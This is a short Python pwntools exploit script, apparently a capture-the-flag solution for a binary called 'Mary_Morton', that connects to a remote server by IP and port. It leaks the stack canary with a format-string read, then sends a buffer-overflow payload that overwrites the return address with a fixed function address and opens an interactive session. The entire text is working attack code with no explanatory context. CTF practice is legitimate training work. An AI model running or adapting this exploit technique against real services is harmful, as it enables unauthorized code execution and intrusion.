from pwn import *
p = remote("61.147.171.105",61299)
#p = process("Mary_Morton")

def fmt_str(payload, choice):
    p.sendlineafter(b'3. Exit the battle \n', str(choice).encode())
    p.sendline(payload)
    info = p.recv().decode().splitlines()[0]
    print("info:"+info)
    return info


step = 6
num = step+(0x90-8)//8
payload = '%' + str(num) + '$p'
canary = int(fmt_str(payload, 2).split('x', 1)[1], 16)
log.info("canary => %#x", canary)

payload = b'A'*(0x90-8) + p64(canary) + b'A'*8 + p64(0x4008DA)
fmt_str(payload,2)

p.interactive()